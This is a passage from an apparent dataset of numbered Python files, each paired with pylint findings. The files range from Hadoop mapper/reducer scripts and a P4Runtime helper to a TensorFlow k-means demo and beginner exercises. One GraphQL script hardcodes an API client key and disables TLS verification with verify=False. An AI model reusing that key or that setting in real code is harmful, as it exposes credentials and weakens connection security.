33      # for the last question, print id, question length, avg answer length
34      if AnsLengthList == []:
35         print oldQuestionNode,""\t"",oldQuestionLength,""\t"", 0
36      else:
37         print oldQuestionNode,""\t"",oldQuesitionLength,""\t"", sum(AnsLengthList)/len(AnsLengthList)
","17 - error: syntax-error
"
"1   #!/usr/bin/python
2   
3   import sys
4   
5   oldTag = None # save the oldTag
6   oldTagCount = 0 # save the oldTag's Count
7   Top10Tag = [] # the list of top 10 tags
8   Top10TagCount = [] # the list of top 1 tags' counts
9   
10   for line in sys.stdin:
11       tag = line
12   
13       if oldTag and oldTag != tag:
14          # check if the old tag's count beats the current 10th tag
15          # if so, replace the current 10th tag, and its count, with those of the old tag 
16   
17          if len(Top10TagCount) == 10:        
18             if oldTagCount > min(Top10TagCount) :
19                Top10Tag[Top10TagCount.index(min(Top10TagCount))]=oldTag
20                Top10TagCount[Top10TagCount.index(min(Top10TagCount))]=oldTagCount
21          else:
22             Top10Tag.append(oldTag)
23             Top10TagCount.append(oldTagCount)
24   
25          oldTag = tag # set tag to the new one
26          oldTagCount = 0
27   
28       oldTag = tag
29       oldTagCount = oldTagCount+1
30   
31   
32   if oldTag != None:
33      # for the last tag, print id, question length, avg answer length
34      # check if the old tag's count beats the current 10th tag
35      # if so, replace the current 10th tag, and its count, with those of the old tag  
36      if oldTagCount > min(Top10TagCount) :
37         Top10Tag[Top10TagCount.index(min(Top10TagCount))]=oldTag
38         Top10TagCount[Top10TagCount.index(min(Top10TagCount))]=oldTagCount
39   
40   # Sort the final top 10 list, and print out
41   for i in range(10):
42   
43       print Top10Tag[Top10TagCount.index(max(Top10TagCount))], ""\t"", max(Top10TagCount)
44   
45       del Top10Tag[Top10TagCount.index(max(Top10TagCount))]
46       del Top10TagCount[Top10TagCount.index(max(Top10TagCount))]
","43 - error: syntax-error
"
"1   #!/usr/bin/python
2   
3   import sys
4   import csv
5   
6   reader = csv.reader(sys.stdin, delimiter='\t')
7   
8   for line in reader:
9       post_id = line[0]
10       post_type = line[5]
11       author_id = line[3]
12       abs_parent_id = line[7]
13   
14       if post_id == ""id"":
15          continue
16   
17       if post_type[0] == ""q"": # i.e. if the post is a ""question"" 
18          print post_id ,""\t"", author_id 
19   
20       if post_type[0] != ""q"": # i.e. if the post is an ""answer"" or ""comment""
21          print abs_parent_id, ""\t"", author_id 
","18 - error: syntax-error
"
"1   from python_graphql_client import GraphqlClient
2   
3   API_KEY = '5f8fbc2aa23e93716e7c621b'
4   client = GraphqlClient(endpoint=""https://staging-api.chargetrip.io/graphql"")
5   client.headers = {
6       'x-client-id': API_KEY
7   }
8   
9   query = """"""
10   query stationListAll ($page: Int!) {
11     stationList(size: 100, page: $page) {
12       id
13       external_id
14       country_code
15       party_id
16       name
17       address
18       city
19       postal_code
20       state
21       country
22       coordinates {
23         latitude
24         longitude
25       }
26       related_locations {
27         latitude
28         longitude
29       }
30       parking_type
31       evses {
32         uid
33         evse_id
34         status
35         status_schedule {
36           period_begin
37           period_end
38           status
39         }
40         capabilities
41         connectors {
42           id
43           standard
44           format
45           power_type
46           max_voltage
47           max_amperage
48           max_electric_power
49           power
50           tariff_ids
51           terms_and_conditions
52           last_updated
53           properties
54         }
55         floor_level
56         coordinates {
57           latitude
58           longitude
59   			}
60         physical_reference
61         parking_restrictions
62         images {
63           url
64           thumbnail
65           category
66           type
67           width
68           height
69         }
70         last_updated
71         parking_cost
72         properties
73       }
74       directions  {
75         language
76         text
77       }
78       operator {
79         id
80         external_id
81         name
82         website
83         logo {
84           url
85           thumbnail
86           category
87           type
88           width
89           height
90         }
91         country
92         contact {
93           phone
94           email
95           website
96           facebook
97           twitter
98           properties
99         }
100       }
101       suboperator {
102         id
103         name
104       }
105       owner {
106         id
107         name
108       }
109       facilities
110       time_zone
111       opening_times {
112         twentyfourseven
113         regular_hours {
114           weekday
115           period_begin
116           period_end
117         }
118         exceptional_openings {
119           period_begin
120           period_end
121         }
122         exceptional_closings {
123           period_begin
124           period_end
125         }
126       }
127       charging_when_closed
128       images {
129         url
130         thumbnail
131         category
132         type
133         width
134         height
135       }
136       last_updated
137       location {
138         type
139         coordinates
140       }
141       elevation
142       chargers {
143         standard
144         power
145         price
146         speed
147         status {
148           free
149           busy
150           unknown
151           error
152         }
153         total
154       }
155       physical_address {
156         continent
157         country
158         county
159         city
160         street
161         number
162         postalCode
163         what3Words
164         formattedAddress
165       }
166       amenities
167       properties
168       realtime
169       power
170       speed
171       status
172       review {
173         rating
174         count
175       }
176     }
177   }
178   """"""
179   variables = {""page"": 1}
180   result = client.execute(query=query, variables=variables, verify=False)
181   
182   print(result)","Clean Code: No Issues Detected
"
"1   import os
2   import json
3   
4   filepath = r""/home/axel/Documents/electralign-data/stations-all.json""
5   newData = {""data"": {""stationList"": []}}
6   
7   if os.path.isfile(filepath):
8       with open(filepath, 'r') as file:
9           print(""File opened"")
10           data = json.load(file)
11           print(""Data loaded"")
12           newData[""data""][""stationList""] = data
13           print(""new data set"")
14   
15   filepath = r""/home/axel/Documents/electralign-data/stations-all-fixed.json""
16   with open(filepath, 'w') as file:
17       print(""New file opened"")
18       json.dump(newData, file)
19       print(""Done saving data"")
","8 - warning: unspecified-encoding
16 - warning: unspecified-encoding
"
"1   import os
2   import json
3   
4   path = r""/home/axel/Documents/electralign-data/""
5   stations = []
6   
7   for filename in sorted(os.listdir(path)):
8       filepath = os.path.join(path, filename)
9       if os.path.isfile(filepath):
10           print(filename)
11           with open(filepath, 'r') as file:
12               data = json.load(file)
13               stations += data
14   
15   
16   with open(path+'stations-all.json', 'w') as file:
17       json.dump(stations, file)
18   
19   print(""Saved "" + str(len(stations)) + "" stations"")
","11 - warning: unspecified-encoding
16 - warning: unspecified-encoding
"
"1   # Copyright 2017-present Open Networking Foundation
2   #
3   # Licensed under the Apache License, Version 2.0 (the ""License"");
4   # you may not use this file except in compliance with the License.
5   # You may obtain a copy of the License at
6   #
7   #    http://www.apache.org/licenses/LICENSE-2.0
8   #
9   # Unless required by applicable law or agreed to in writing, software
10   # distributed under the License is distributed on an ""AS IS"" BASIS,
11   # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
12   # See the License for the specific language governing permissions and
13   # limitations under the License.
14   #
15   from abc import abstractmethod
16   
17   import grpc
18   from p4 import p4runtime_pb2
19   from p4.tmp import p4config_pb2
20   
21   from p4info import p4browser
22   
23   
24   def buildSetPipelineRequest(p4info, device_config, device_id):
25       request = p4runtime_pb2.SetForwardingPipelineConfigRequest()
26       config = request.configs.add()
27       config.device_id = device_id
28       config.p4info.CopyFrom(p4info)
29       config.p4_device_config = device_config.SerializeToString()
30       request.action = p4runtime_pb2.SetForwardingPipelineConfigRequest.VERIFY_AND_COMMIT
31       return request
32   
33   
34   def buildTableEntry(p4info_browser,
35                       table_name,
36                       match_fields={},
37                       action_name=None,
38                       action_params={}):
39       table_entry = p4runtime_pb2.TableEntry()
40       table_entry.table_id = p4info_browser.get_tables_id(table_name)
41       if match_fields:
42           table_entry.match.extend([
43               p4info_browser.get_match_field_pb(table_name, match_field_name, value)
44               for match_field_name, value in match_fields.iteritems()
45           ])
46       if action_name:
47           action = table_entry.action.action
48           action.action_id = p4info_browser.get_actions_id(action_name)
49           if action_params:
50               action.params.extend([
51                   p4info_browser.get_action_param_pb(action_name, field_name, value)
52                   for field_name, value in action_params.iteritems()
53               ])
54       return table_entry
55   
56   
57   class SwitchConnection(object):
58       def __init__(self, name, address='127.0.0.1:50051', device_id=0):
59           self.name = name
60           self.address = address
61           self.device_id = device_id
62           self.p4info = None
63           self.channel = grpc.insecure_channel(self.address)
64           # TODO Do want to do a better job managing stub?
65           self.client_stub = p4runtime_pb2.P4RuntimeStub(self.channel)
66   
67       @abstractmethod
68       def buildDeviceConfig(self, **kwargs):
69           return p4config_pb2.P4DeviceConfig()
70   
71       def SetForwardingPipelineConfig(self, p4info_file_path, dry_run=False, **kwargs):
72           p4info_broswer = p4browser.P4InfoBrowser(p4info_file_path)
73           device_config = self.buildDeviceConfig(**kwargs)
74           request = buildSetPipelineRequest(p4info_broswer.p4info, device_config, self.device_id)
75           if dry_run:
76               print ""P4 Runtime SetForwardingPipelineConfig:"", request
77           else:
78               self.client_stub.SetForwardingPipelineConfig(request)
79           # Update the local P4 Info reference
80           self.p4info_broswer = p4info_broswer
81   
82       def buildTableEntry(self,
83                           table_name,
84                           match_fields={},
85                           action_name=None,
86                           action_params={}):
87           return buildTableEntry(self.p4info_broswer, table_name, match_fields, action_name, action_params)
88   
89       def WriteTableEntry(self, table_entry, dry_run=False):
90           request = p4runtime_pb2.WriteRequest()
91           request.device_id = self.device_id
92           update = request.updates.add()
93           update.type = p4runtime_pb2.Update.INSERT
94           update.entity.table_entry.CopyFrom(table_entry)
95           if dry_run:
96               print ""P4 Runtime Write:"", request
97           else:
98               print self.client_stub.Write(request)
99   
100       def ReadTableEntries(self, table_name, dry_run=False):
101           request = p4runtime_pb2.ReadRequest()
102           request.device_id = self.device_id
103           entity = request.entities.add()
104           table_entry = entity.table_entry
105           table_entry.table_id = self.p4info_broswer.get_tables_id(table_name)
106           if dry_run:
107               print ""P4 Runtime Read:"", request
108           else:
109               for response in self.client_stub.Read(request):
110                   yield response
111   
112       def ReadDirectCounters(self, table_name=None, counter_name=None, table_entry=None, dry_run=False):
113           request = p4runtime_pb2.ReadRequest()
114           request.device_id = self.device_id
115           entity = request.entities.add()
116           counter_entry = entity.direct_counter_entry
117           if counter_name:
118               counter_entry.counter_id = self.p4info_broswer.get_direct_counters_id(counter_name)
119           else:
120               counter_entry.counter_id = 0
121           # TODO we may not need this table entry
122           if table_name:
123               table_entry.table_id = self.p4info_broswer.get_tables_id(table_name)
124               counter_entry.table_entry.CopyFrom(table_entry)
125           counter_entry.data.packet_count = 0
126           if dry_run:
127               print ""P4 Runtime Read:"", request
128           else:
129               for response in self.client_stub.Read(request):
130                   print response
","76 - error: syntax-error
"
"1   # Copyright 2017-present Open Networking Foundation
2   #
3   # Licensed under the Apache License, Version 2.0 (the ""License"");
4   # you may not use this file except in compliance with the License.
5   # You may obtain a copy of the License at
6   #
7   #    http://www.apache.org/licenses/LICENSE-2.0
8   #
9   # Unless required by applicable law or agreed to in writing, software
10   # distributed under the License is distributed on an ""AS IS"" BASIS,
11   # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
12   # See the License for the specific language governing permissions and
13   # limitations under the License.
14   #
15   import re
16   
17   import google.protobuf.text_format
18   from p4 import p4runtime_pb2
19   from p4.config import p4info_pb2
20   
21   
22   class P4InfoBrowser(object):
23       def __init__(self, p4_info_filepath):
24           p4info = p4info_pb2.P4Info()
25           # Load the p4info file into a skeleton P4Info object
26           with open(p4_info_filepath) as p4info_f:
27               google.protobuf.text_format.Merge(p4info_f.read(), p4info)
28           self.p4info = p4info
29   
30       def get(self, entity_type, name=None, id=None):
31           if name is not None and id is not None:
32               raise AssertionError(""name or id must be None"")
33   
34           for o in getattr(self.p4info, entity_type):
35               pre = o.preamble
36               if name:
37                   if (pre.name == name or pre.alias == name):
38                       return o
39               else:
40                   if pre.id == id:
41                       return o
42   
43           if name:
44               raise AttributeError(""Could not find %r of type %s"" % (name, entity_type))
45           else:
46               raise AttributeError(""Could not find id %r of type %s"" % (id, entity_type))
47   
48       def get_id(self, entity_type, name):
49           return self.get(entity_type, name=name).preamble.id
50   
51       def get_name(self, entity_type, id):
52           return self.get(entity_type, id=id).preamble.name
53   
54       def get_alias(self, entity_type, id):
55           return self.get(entity_type, id=id).preamble.alias
56   
57       def __getattr__(self, attr):
58           # Synthesize convenience functions for name to id lookups for top-level entities
59           # e.g. get_table_id() or get_action_id()
60           m = re.search(""^get_(\w+)_id$"", attr)
61           if m:
62               primitive = m.group(1)
63               return lambda name: self.get_id(primitive, name)
64   
65           # Synthesize convenience functions for id to name lookups
66           m = re.search(""^get_(\w+)_name$"", attr)
67           if m:
68               primitive = m.group(1)
69               return lambda id: self.get_name(primitive, id)
70   
71           raise AttributeError(""%r object has no attribute %r"" % (self.__class__, attr))
72   
73       # TODO remove
74       def get_table_entry(self, table_name):
75           t = self.get(table_name, ""table"")
76           entry = p4runtime_pb2.TableEntry()
77           entry.table_id = t.preamble.id
78           entry
79           pass
80   
81       def get_match_field(self, table_name, match_field_name):
82           for t in self.p4info.tables:
83               pre = t.preamble
84               if pre.name == table_name:
85                   for mf in t.match_fields:
86                       if mf.name == match_field_name:
87                           return mf
88   
89       def get_match_field_id(self, table_name, match_field_name):
90           return self.get_match_field(table_name,match_field_name).id
91   
92       def get_match_field_pb(self, table_name, match_field_name, value):
93           p4info_match = self.get_match_field(table_name, match_field_name)
94           bw = p4info_match.bitwidth
95           p4runtime_match = p4runtime_pb2.FieldMatch()
96           p4runtime_match.field_id = p4info_match.id
97           # TODO switch on match type and map the value into the appropriate message type
98           match_type = p4info_pb2._MATCHFIELD_MATCHTYPE.values_by_number[
99               p4info_match.match_type].name
100           if match_type == 'EXACT':
101               exact = p4runtime_match.exact
102               exact.value = value
103           elif match_type == 'LPM':
104               lpm = p4runtime_match.lpm
105               lpm.value = value[0]
106               lpm.prefix_len = value[1]
107           # TODO finish cases and validate types and bitwidth
108           # VALID = 1;
109           # EXACT = 2;
110           # LPM = 3;
111           # TERNARY = 4;
112           # RANGE = 5;
113           # and raise exception
114           return p4runtime_match
115   
116       def get_action_param(self, action_name, param_name):
117           for a in self.p4info.actions:
118               pre = a.preamble
119               if pre.name == action_name:
120                   for p in a.params:
121                       if p.name == param_name:
122                           return p
123           raise AttributeError(""%r has no attribute %r"" % (action_name, param_name))
124   
125   
126       def get_action_param_id(self, action_name, param_name):
127           return self.get_action_param(action_name, param_name).id
128   
129       def get_action_param_pb(self, action_name, param_name, value):
130           p4info_param = self.get_action_param(action_name, param_name)
131           #bw = p4info_param.bitwidth
132           p4runtime_param = p4runtime_pb2.Action.Param()
133           p4runtime_param.param_id = p4info_param.id
134           p4runtime_param.value = value # TODO make sure it's the correct bitwidth
135           return p4runtime_param","73 - warning: fixme
97 - warning: fixme
107 - warning: fixme
134 - warning: fixme
60 - warning: anomalous-backslash-in-string
66 - warning: anomalous-backslash-in-string
22 - refactor: useless-object-inheritance
26 - warning: unspecified-encoding
30 - warning: redefined-builtin
37 - refactor: consider-using-in
43 - refactor: no-else-raise
51 - warning: redefined-builtin
54 - warning: redefined-builtin
78 - warning: pointless-statement
79 - warning: unnecessary-pass
81 - refactor: inconsistent-return-statements
98 - warning: protected-access
94 - warning: unused-variable
"
"1   import tensorflow as tf
2   import numpy as np
3   import time
4   
5   #help us to graph
6   import matplotlib
7   import matplotlib.pyplot as plt
8   
9   #import datasets we need by scikit-learn
10   from sklearn.datasets.samples_generator import make_blobs
11   from sklearn.datasets.samples_generator import make_circles
12   #fuck Here I install scipy a matherical package
13   
14   #set up data type , here i choose blobs to make it simpler
15   DATA_TYPE = ""blobs""
16   
17   #Set up Number of clusters in train data , if we choose circle,2 is enough
18   K = 4
19   if(DATA_TYPE == ""circle""):
20       K = 2
21   else:
22       K = 4
23   
24   #Set up max of iterations , if condition is not met , here I choose 1000
25   MAX_ITERS = 1000
26   
27   #To caculate the time we use , record the begining time
28   start = time.time()
29   
30   #Since we have chosen four clusters , We have to give four center points for training data
31   centers = [(-2, -2), (-2, 1.5), (1.5, -2), (2, 1.5)]
32   #set up the training set
33   #for blobs:
34    #n_samples:number of data,which means we have 200 points
35    #centers = centers
36    #n_features = dimmension , here we choose plane so = 2
37    #cluster_std = std
38    #shuffle:if we mix up samples,here I choose false
39    #random_state:random seed
40   #for circles:
41    #noise: random noise data set up to the sample set
42    #factor: the ratio factor  between circle data set
43   if(DATA_TYPE == ""circle""):
44       data, features = make_circles(n_samples=200,shuffle=True,noise=None,factor=0.4)
45   else:
46       data, features = make_blobs(n_samples=200,centers=centers,n_features=2,cluster_std=0.8,shuffle=False,random_state=42)
47   
48   #Draw the four centers
49   #.transpose[0]: x   .transpose[1]: y
50   fig, ax = plt.subplots()
51   ax.scatter(np.asarray(centers).transpose()[0], np.asarray(centers).transpose()[1], marker = 'o', s = 250)
52   plt.show()
53   #Draw the training data
54   fig, ax = plt.subplots()
55   if(DATA_TYPE == ""blobs""):
56       ax.scatter(np.asarray(centers).transpose()[0], np.asarray(centers).transpose()[1], marker = 'o', s = 250)
57       ax.scatter(data.transpose()[0],data.transpose()[1], marker = 'o', s = 100 , c = features, cmap =plt.cm.coolwarm)
58       plt.plot()
59       plt.show()
60   
61   #Set up tf.Variable
62    #points = data
63    #cluster_assignments = each points 's cluster
64     #for example:
65      #cluster_assignments[13]=2 means 13th point belong cluster 2
66   N = len(data)
67   points = tf.Variable(data)
68   cluster_assignments = tf.Variable(tf.zeros([N], dtype=tf.int64))
69   
70   #centroids: each groups 's centroids
71   #tf.slice() really fuck up
72   #random pick 4 point after all
73   centroids = tf.Variable(tf.slice(points.initialized_value(), [0,0], [K,2]))
74   
75   sess = tf.Session()
76   sess.run(tf.initialize_all_variables())
77   
78   sess.run(centroids)
79   
80   # Lost function and rep loop
81   #centroids = [[x1,y1],[x2,y2],[x3,y3],[x4,y4]] shape=[4,2]
82   #tf.tile(centroids, [N, 1]) = [N*[x1,y1], N*[x2,y2], N*[x3,y3], N*[x4,y4]] shape=[4N,2]
83   #rep_centroids = tf.reshape(tf.tile(centroids, [N,1]), [N,K,2]) = [ [N*[x1,y1]] , [N*[x2,y2]] , [N*[x3,y3]] , [N*[x4,y4]] ]
84   #The condition of stopping process is : ""Centroids stop changing"" :: did_assignments_change
85   
86   rep_centroids = tf.reshape(tf.tile(centroids, [N,1]), [N,K,2])
87   rep_points = tf.reshape(tf.tile(points, [1, K]),[N, K, 2])
88   sum_squares = tf.reduce_sum(tf.square(rep_points - rep_centroids), reduction_indices=2)
89   best_centroids = tf.argmin(sum_squares, 1)
90   did_assignments_change = tf.reduce_any(tf.not_equal(best_centroids, cluster_assignments))
91   
92   #total=[[all sum of points of group 1], [all sum of points of group 2], [all sum of points of group 3], [all sum of points of group 4]] shape=[4,2]
93   #count=[How many points of each group] shape = [4,1]
94   #total/count = [new centroids] shape = [4,1]
95   def bucket_mean(data, bucket_ids, num_buckets):
96       total = tf.unsorted_segment_sum(data, bucket_ids, num_buckets)
97       count = tf.unsorted_segment_sum(tf.ones_like(data), bucket_ids, num_buckets)
98       return total/count
99   
100   means = bucket_mean(points, best_centroids, K)
101   
102   #Do update
103   with tf.control_dependencies([did_assignments_change]):
104       do_updates = tf.group(centroids.assign(means), cluster_assignments.assign(best_centroids))
105   
106   changed = True
107   iters = 0
108   fig, ax = plt.subplots()
109   if(DATA_TYPE == ""blobs""):
110       colourindexes = [2,1,4,3]
111   else:
112       colourindexes = [2,1]
113   
114   while changed and iters < MAX_ITERS:
115       fig, ax = plt.subplots()
116       iters +=1
117       [changed, _] = sess.run([did_assignments_change, do_updates])
118       [centers, assignments] = sess.run([centroids, cluster_assignments])
119       ax.scatter(sess.run(points).transpose()[0], sess.run(points).transpose()[1], marker = 'o', s = 200, c = assignments, cmap=plt.cm.coolwarm)
120       ax.scatter(centers[:,0], centers[:,1], marker = '^', s = 550, c=colourindexes, cmap=plt.cm.plasma)
121       ax.set_title(""Iteration "" + str(iters))
122       plt.savefig(""kmeans"" + str(iters) + "".png"")
123   
124   ax.scatter(sess.run(points).transpose()[0], sess.run(points).transpose()[1], marker='o', s=200, c=assignments, cmap=plt.cm.coolwarm)
125   plt.show()
126   end = time.time()
127   print(""Found in %.2f seconds"" %(end-start), iters, ""iterations"")
128   print(""Centroids: "")
129   print(centers)
130   print(""Cluster assignment"", assignments)","95 - warning: redefined-outer-name
6 - warning: unused-import
"
"1   from sklearn import datasets
2   from sklearn.model_selection import train_test_split
3   from sklearn.neighbors import KNeighborsClassifier
4   
5   
6   iris = datasets.load_iris()
7   iris_X = iris.data
8   iris_y = iris.target
9   
10   print(""=====data====="")
11   print(iris_X)
12   print(""==============="")
13   print(""data length : "" + str(len(iris_X)))
14   print(""====target===="")
15   print(iris_y)
16   print(""==============="")
17   print(""target length : "" + str(len(iris_y)))
18   print(""==============="")
19   X_train, X_test, y_train, y_test = train_test_split(iris_X, iris_y, test_size=0.3)
20   
21   print(y_train)
22   
23   knn = KNeighborsClassifier()
24   knn.fit(X_train, y_train)
25   
26   print(knn.predict(X_test))
27   print(y_test)","Clean Code: No Issues Detected
"
"1   class Trinangle:
2       def __init__(self,base,height):
3           self.base = base
4           self.height = height
5       def calculate_area(self):
6           area = 0.5 * self.base * self.height
7           print(f""Base: {self.base}, Height: {self.height}"",""Area = "",area)
8   
9   t1 = Trinangle(10,20)
10   t1.calculate_area()
11   t2 = Trinangle(20,30)
12   t2.calculate_area()","1 - refactor: too-few-public-methods
"
"1   #Map Function
2   
3   def square(a):
4       return a*a
5   
6   num = [1,2,3,4,5]
7   result = list(map(square,num))
8   print(result)
9   
10   # Filter function
11   
12   num = [1,2,3,4,5]
13   
14   result = list(filter(lambda x: x%2==0,num))
15   print(result)
","Clean Code: No Issues Detected
"
"1   def add(a,b):
2       sum = a+b
3       return sum
4   result = add(20,30)
5   print(""Result = "",result)","2 - warning: redefined-builtin
"
"1   #Stack
2   """"""
3   books = []
4   books.append(""Learn C"")
5   books.append(""Learn C++"")
6   books.append(""Learn Java"")
7   print(books)
8   books.pop()
9   print(""Now the top book is :"",books[-1])
10   print(books)
11   books.pop()
12   print(""Now the top book is :"",books[-1])
13   print(books)
14   books.pop()
15   if not books:
16       print(""No books left"")
17   
18   """"""
19   #Queue
20   from collections import deque
21   bank = deque([""Alex"",""Sabuj"",""Sonia"",""Moeen""])
22   print(bank)
23   bank.popleft()
24   print(bank)
25   bank.popleft()
26   bank.popleft()
27   bank.popleft()
28   if not bank:
29       print(""no person left"")","Clean Code: No Issues Detected
"
"1   # Using string Function
2   """"""
3   sampleStr = ""Emma is good developer. Emma is a writer""
4   cnt = sampleStr.count(""Emma"")
5   print(""Emma appeared"",cnt,""times"")
6   """"""
7   
8   #Without Using String function
9   
10   def count_emma(str):
11       print(""Given String : "",str)
12       count = 0
13       for i in range(len(str) -1):
14           count += str[i: i+4] == 'Emma'
15       return count
16   count = count_emma(""Emma is good devveloper. Emma is a writer"")
17   print(""Emma appeared "",count,""times"")","10 - warning: redefined-builtin
12 - warning: redefined-outer-name
"
"1   """"""
2   num2 = int(input(""Enter a number: ""))
3   result = 20 / num2
4   print(result)
5   print(""Done"")
6   """"""
7   """"""
8   text = ""Alex""
9   print(text)
10   print(""Done"")
11   """"""
12   """"""
13   try:
14       list = [20,0,32]
15       result = list[0] / list[3]
16       print(result)
17       print(""Done"")
18   except ZeroDivisionError:
19       print(""Dividing by zero is not possible "")
20   except IndexError:
21       print(""Index Error"")
22   finally:
23       print(""Thanks!!!!!!!!!!"")
24   """"""
25   #Multiple exception hangle
26   """"""
27   try:
28       num1 = int(input(""Enter First Number: ""))
29       num2 = int(input(""Enter the Second Number: ""))
30       result = num1/num2
31       print(result)
32   except (ValueError,ZeroDivisionError):
33       print(""You have entered incorrect input."")
34   finally:
35       print(""Thanks!!!!!!!"")
36   """"""
37   def voter (age):
38       if age < 18:
39           raise ValueError(""Invalid Voter"")
40       return ""You are Allowed to vote""
41   try:
42       print(voter(17))
43   except ValueError as e:
44       print(e)","7 - warning: pointless-string-statement
12 - warning: pointless-string-statement
26 - warning: pointless-string-statement
"
"1   num = [1,2,3,4,5]
2   
3   #[expression for item in list]
4   
5   result = [x for x in num if x%2==0]
6   print(result)
","Clean Code: No Issues Detected
"
"1   #Multi level inheritance
2   
3   """"""
4   class A:
5       def display1(self):
6           print(""I am inside A class"")
7   
8   class B(A):
9       def display2(self):
10           print(""I am inside B class"")
11   
12   class C(B):
13       def display3(self):
14           super().display1()
15           super().display2()
16           print(""I am inside C class"")
17   
18           ob1 = C()
19           ob1.display3()
20   """"""
21   
22   #Multiple inheritance
23   
24   class A:
25       def display(self):
26           print(""I am inside A class"")
27   
28   class B:
29       def display(self):
30           print(""I am inside B class"")
31   
32   class C(B,A):
33       pass
34   
35   ob1 = C()
36   ob1.display()
","24 - refactor: too-few-public-methods
28 - refactor: too-few-public-methods
32 - refactor: too-few-public-methods
"
"1   def mergeList(list1, list2):
2       print(""First List "", list1)
3       print(""Second List "", list2)
4       thirdList = []
5       for num in list1:
6           if (num % 2 != 0):
7               thirdList.append(num)
8       for num in list2:
9           if (num % 2 == 0):
10               thirdList.append(num)
11       return thirdList
12   list1 = [10, 20, 35, 11, 27]
13   list2 = [13, 43, 33, 12, 24]
14   
15   print(""Result List is "", mergeList(list1, list2))","1 - warning: redefined-outer-name
1 - warning: redefined-outer-name
"
"1   
2   n = 3
3   for i in range(n + 1):
4       print((2 * i - 1) * "" *"")
","Clean Code: No Issues Detected
"
"1   # 2 kinds of funmctions
2   """"""
3   Library -> print(), input()
4   
5   userdefine -> make your own need
6   """"""
7   def add(a,b):
8       sum = a+b
9       print(sum)
10   def sub(x,y):
11       sub = x-y
12       print(sub)
13   add(10,15)
14   sub(15,7)
15   def message():
16       print(""No parameter"")
17   message()
","8 - warning: redefined-builtin
11 - warning: redefined-outer-name
"
"1   num = list(range(10))
2   print(num)
3   print(num[2])
4   
5   num = list(range(2,5))
6   print(num)
7   
8   num = list(range(2,101,2))
9   print(num)","Clean Code: No Issues Detected
"
"1   
2   def char(str):
3       for i in range(0, len(str), 1):
4           print(""index["",i,""]"", str[i])
5   str = input(""Enter any name: "")
6   
7   print(""Print Single Charecter: "")
8   char(str)
9   
10   """"""
11   
12   def printEveIndexChar(str):
13     for i in range(0, len(str)-1, 2):
14       print(""index["",i,""]"", str[i] )
15   
16   inputStr = ""pynative""
17   print(""Orginal String is "", inputStr)
18   
19   print(""Printing only even index chars"")
20   printEveIndexChar(inputStr)
21   
22   """"""","5 - warning: redefined-builtin
2 - warning: redefined-outer-name
10 - warning: pointless-string-statement
"
"1   class Student:
2       roll = """"
3       gpa = """"
4       def __init__(self,roll,gpa):
5           self.roll = roll
6           self.gpa = gpa
7       def display(self):
8           print(f""Roll: {self.roll}, GPA: {self.gpa}"")
9   
10   rahim = Student(464,4.50)
11   rahim.display()
12   
13   karim = Student(525,4.98)
14   karim.display()","1 - refactor: too-few-public-methods
"
"1   students = (
2   
3       (""Alex Biswas"",21,3.46),
4       (""Sabuj Chandra Das"",22,3.69),
5       (""Ahad Islam Moeen"",22,3.46),
6   )
7   
8   print(students[0:])","Clean Code: No Issues Detected
"
"1   #Parents class , Super class, Base class
2   class Phone:
3       def call(self):
4           print(""You can Call"")
5   
6       def message(self):
7           print(""You can Message"")
8   
9   #Child class, Sub class, Derived class
10   class Samsung(Phone):
11       def photo(self):
12           print(""You can Take Photo"")
13   
14   s = Samsung()
15   s.call()
16   s.message()
17   s.photo()
18   
19   print(issubclass(Phone,Samsung))","Clean Code: No Issues Detected
"
"1   
2   studentid = {
3   
4       464 : ""Alex Biswas"",
5       525 : ""Sabuj Chandra Das"",
6       957 : ""Sonia Akter"",
7       770 : ""Tasni Tasnim Nilima"",
8   }
9   print(studentid.get(525,""Not a valid key""))","Clean Code: No Issues Detected
"
"1   file = open(""Hello.html"",""w"")
2   
3   file.write(""<h1> This is a text</h1>"")
4   
5   file.close()","1 - warning: unspecified-encoding
1 - refactor: consider-using-with
"
"1   num1 = {1,2,3,4,5}
2   num2 = set([4,5,6])
3   num2.add(7)
4   num2.remove(4)
5   print(num1 | num2)
6   print(num1 & num2)
7   print(num1 - num2)","Clean Code: No Issues Detected
"
"1   class Student:
2       roll = "" ""
3       gpa = "" ""
4   
5   rahim = Student()
6   print(isinstance(rahim,Student))
7   rahim.roll = 101
8   rahim.gpa = 3.95
9   print(f""Roll: {rahim.roll}, GPA: {rahim.gpa}"")
10   
11   karim = Student()
12   print(isinstance(karim,Student))
13   karim.roll = 102
14   karim.gpa = 4.85
15   print(f""Roll: {karim.roll}, GPA: {karim.gpa}"")","1 - refactor: too-few-public-methods
"
"1   """"""
2   import re
3   pattern = r""colour""
4   text = r""My favourite colour is Red""
5   match = re.search(pattern,text)
6   if match:
7       print(match.start())
8       print(match.end())
9       print(match.span())
10   
11   """"""
12   
13   
14   #Search And Replace
15   
16   """"""
17   import re
18   pattern = r""colour""
19   text = r""My favourite colour is Red. I love blue colour as well""
20   text1 = re.sub(pattern,""color"",text,count=1)
21   print(text1)
22   """"""
23   #Metacharecter
24   
25   import re
26   pattern = r""[A-Z] [a-z] [0-9]""
27   
28   if re.match(pattern,""Ag0""):
29       print(""Matched"")","16 - warning: pointless-string-statement
"
"1   from area import *
2   
3   rectangle_area(25,6)
4   triangle_area(10,15)","1 - warning: wildcard-import
3 - error: undefined-variable
4 - error: undefined-variable
"
"1   import random
2   
3   for x in range(1,6):
4       guessNumber = int(input(""Enter your guess between 1 to 5 : ""))
5       randomNumber = random.randint(1,5)
6   
7       if guessNumber == randomNumber:
8           print(""You have won"")
9       else:
10           print(""You have loss"", randomNumber)","Clean Code: No Issues Detected
"
"1   """"""
2   def calculate(a,b):
3      return a*a + 2*a*b + b*b
4   lambda parameter : a*a + 2*a*b + b*b
5   print(calculate(2,3))
6   """"""
7   a = (lambda a,b : a*a + 2*a*b + b*b) (2,3)
8   print(a)
9   #another
10   def cube(x):
11       return x*x*x
12   a = (lambda x : x*x*x) (3)
13   print(a)","Clean Code: No Issues Detected
"
"1   import pyttsx3
2   friend = pyttsx3.init()
3   friend.say('I can speak now')
4   friend.runAndWait()","Clean Code: No Issues Detected
"
"1   #xargs
2   """"""
3   def student(id,name):
4       print(id,name)
5   student(191,""Alex Biswas"")
6   """"""
7   
8   """"""
9   def student(*details):
10       print(details)
11   student(191,""Alex"",3.46)
12   student(192,""Alex"",3.46)
13   """"""
14   
15   """"""
16   def add(*numbers):
17       sum = 0
